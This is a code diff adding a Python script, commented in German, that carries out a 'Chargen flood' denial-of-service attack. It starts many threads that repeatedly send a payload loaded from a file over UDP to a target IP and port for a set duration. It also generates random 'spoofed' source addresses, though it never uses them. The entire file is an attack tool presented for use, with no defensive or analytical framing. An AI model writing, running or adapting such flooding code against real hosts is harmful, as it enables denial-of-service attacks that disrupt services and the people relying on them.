@@ -1,0 +1,55 @@
+import socket
+import threading
+import time
+import random
+
+def load_payload(payload_path):
+    """Lädt die Payload aus einer Datei"""
+    with open(payload_path, 'rb') as file:
+        return file.read()
+
+def send_chargen_packet(ip, port, payload):
+    """Sendet ein einzelnes UDP-Paket an das Ziel"""
+    try:
+        # Erstelle einen UDP-Socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(payload, (ip, port))
+    except Exception as e:
+        print(f"Fehler beim Senden eines Pakets: {e}")
+    finally:
+        sock.close()
+
+def attack_thread(ip, port, duration, payload):
+    """Führt den Angriff für eine bestimmte Dauer in einem Thread aus"""
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        # Spoofing der Quell-IP ist simuliert, da Python-Sockets dies nicht direkt unterstützen
+        spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        send_chargen_packet(ip, port, payload)
+
+def chargen_attack(ip, port, duration, threads, payload_path):
+    """
+    Führt einen Chargen Flood Angriff aus.
+    :param ip: Ziel-IP-Adresse
+    :param port: Ziel-Port (standardmäßig 19 für Chargen)
+    :param duration: Dauer des Angriffs in Sekunden
+    :param threads: Anzahl der Threads
+    :param payload_path: Pfad zur Datei mit der Payload
+    """
+    print(f"Start des Chargen Flood Angriffs auf {ip}:{port} für {duration} Sekunden mit {threads} Threads.")
+    
+    # Lade die Payload
+    payload = load_payload(payload_path)
+
+    # Starte mehrere Threads
+    thread_list = []
+    for _ in range(threads):
+        thread = threading.Thread(target=attack_thread, args=(ip, port, duration, payload))
+        thread_list.append(thread)
+        thread.start()
+
+    # Warte auf die Fertigstellung aller Threads
+    for thread in thread_list:
+        thread.join()
+
+    print("Angriff beendet.")
